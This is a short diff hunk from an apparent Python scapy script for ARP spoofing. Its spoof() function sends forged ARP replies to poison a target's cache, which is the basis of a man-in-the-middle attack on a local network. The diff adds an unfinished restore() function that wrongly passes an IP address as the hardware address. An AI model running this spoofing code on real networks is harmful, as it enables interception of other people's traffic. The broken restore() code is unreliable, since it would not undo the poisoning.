@@ -16,7 +16,8 @@ def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) #op=2 creates response instead of request; pdst=IP; hwdst=MAC; psrc=source
     scapy.send(packet, verbose=False) #verbose=False gets rid of constantly telling user that packet was sent
 
-
+def restore(destination_ip, source_ip):
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=source_ip)
 
 try:
     sent_packets_count = 0
